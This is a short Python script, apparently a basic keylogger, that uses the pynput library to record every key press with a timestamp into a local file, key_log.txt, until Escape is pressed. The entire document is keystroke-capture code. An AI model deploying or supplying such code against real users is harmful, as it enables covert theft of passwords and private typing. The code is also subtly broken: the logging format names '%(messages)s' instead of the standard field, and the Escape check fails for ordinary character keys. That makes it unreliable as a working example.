from pynput.keyboard import Key, Listener
import logging

# make a log file

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format=' %(asctime)s: %(messages)s: ')

def on_press(key):
    logging.info(str(key))

    if key == key.esc:
     return False

with Listener(on_press=on_press) as Listener:
    Listener.join()
